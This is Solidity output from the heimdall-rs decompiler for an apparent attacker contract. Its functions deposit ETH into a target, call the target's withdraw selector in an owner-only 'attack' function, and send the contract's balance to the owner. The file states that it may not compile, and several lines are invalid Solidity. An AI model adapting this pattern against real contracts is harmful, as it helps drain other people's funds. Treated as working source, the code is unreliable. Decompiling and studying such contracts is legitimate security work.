// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    address public target;
    address public owner;
    
    
    /// @custom:selector    0x24600fc3
    /// @custom:signature   withdrawFunds() public
    function withdrawFunds() public {
        require(address(msg.sender) == (address(owner / 0x01)), "Only the owner can withdraw funds");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x21;
        var_e = 0x4f6e6c7920746865206f776e65722063616e2077697468647261772066756e64;
        var_f = 0x7300000000000000000000000000000000000000000000000000000000000000;
        (bool success, bytes memory ret0) = address(owner / 0x01).transfer(address(this).balance);
    }
    
    /// @custom:selector    0x64dd891a
    /// @custom:signature   attack(uint256 arg0) public
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function attack(uint256 arg0) public {
        require(arg0 == arg0);
        require(address(msg.sender) == (address(owner / 0x01)), "Only the owner can initiate the attack");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x26;
        var_e = 0x4f6e6c7920746865206f776e65722063616e20696e6974696174652074686520;
        var_f = 0x61747461636b0000000000000000000000000000000000000000000000000000;
        var_a = 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000;
        var_b = arg0;
        require(address(target / 0x01).code.length);
        (bool success, bytes memory ret0) = address(target / 0x01).{ value: 0 ether }Unresolved_2e1a7d4d(var_b); // call
    }
    
    /// @custom:selector    0x64bf5dcb
    /// @custom:signature   depositToTarget() public payable
    function depositToTarget() public payable {
        var_a = 0xd0e30db000000000000000000000000000000000000000000000000000000000;
        require(address(target / 0x01).code.length);
        (bool success, bytes memory ret0) = address(target / 0x01).{ value: msg.value }deposit(var_b); // call
    }
    
    /// @custom:selector    0xd0e30db0
    /// @custom:signature   deposit() public view
    function deposit() public view {
        require(address(msg.sender) == (address(owner / 0x01)), "Only the owner can deposit funds");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f6e6c7920746865206f776e65722063616e206465706f7369742066756e6473;
    }
}